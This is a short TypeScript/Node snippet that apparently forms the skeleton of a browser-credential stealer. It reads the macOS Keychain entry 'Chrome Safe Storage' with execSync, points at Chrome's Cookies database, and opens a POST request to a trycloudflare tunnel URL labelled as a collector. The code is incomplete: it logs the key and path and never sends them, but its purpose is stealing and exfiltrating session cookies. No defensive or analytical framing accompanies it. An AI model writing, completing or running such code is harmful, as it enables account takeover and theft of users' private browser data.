import * as https from 'https';
import {execSync} from 'child_process';
const collector = 'https://arbitrary-tunnel.trycloudflare.com/receive';
const key = execSync("security find-generic-password -w -s 'Chrome Safe Storage'");
const file = 'Library/Application Support/Google/Chrome/Default/Cookies';
const request = https.request(collector, {method: 'POST'});
console.log(key, file);
